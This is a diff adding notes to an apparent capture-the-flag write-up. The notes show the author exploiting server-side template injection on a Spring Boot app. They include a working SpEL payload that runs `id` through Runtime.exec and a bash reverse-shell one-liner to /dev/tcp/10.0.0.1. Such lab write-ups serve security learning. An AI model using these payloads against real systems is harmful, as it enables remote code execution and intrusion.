@@ -134,4 +134,14 @@ gobuster dir -u http://10.129.227.207:8080 -w /usr/share/wordlists/dirbuster/dir
 		* `$`
 		* `%`
 		* `_`
+* I still wanted to explore the ssti route, so my next step was to look for the template that was being used.
+* Looking further into the whitelabel error page, I found that it is the default error page for a Spring Boot application
+* With this information I started a `ctrl f` search for spring on [payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#java---spring) and found the poc payload `*{7*7}`
+	* Searching for this in the web app resulted in the output of 49; yippee!
+* The next payload I tried was:
+```
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
+```
+* This returned the uids and guids, proving that code execution had been achieved
+* bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 # Root
